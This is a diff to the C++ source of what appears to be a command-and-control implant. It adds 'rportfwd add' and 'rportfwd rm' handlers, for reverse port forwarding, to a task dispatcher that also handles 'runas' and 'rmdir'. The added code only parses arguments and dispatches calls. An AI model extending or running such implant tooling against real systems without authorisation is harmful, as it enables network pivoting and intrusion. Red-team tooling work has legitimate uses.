@@ -299,6 +299,28 @@ namespace Handler
         {
             sm.SetTaskResult(Task::Rmdir(task.substr(6, task.size())));
         }
+        else if (wcscmp(task.substr(0, 13).c_str(), L"rportfwd add ") == 0)
+        {
+            // Parse arguments.
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
+            if (wArgs.size() != 5)
+            {
+                return FALSE;
+            }
+
+            sm.SetTaskResult(Task::RportfwdAdd(sm, wArgs[2], wArgs[3], wArgs[4]));
+        }
+        else if (wcscmp(task.substr(0, 12).c_str(), L"rportfwd rm ") == 0)
+        {
+            // Parse arguments.
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
+            if (wArgs.size() != 4)
+            {
+                return FALSE;
+            }
+
+            sm.SetTaskResult(Task::RportfwdRm(wArgs[2], wArgs[3]));
+        }
         else if (wcscmp(task.substr(0, 6).c_str(), L"runas ") == 0)
         {
             // Parse arguments.
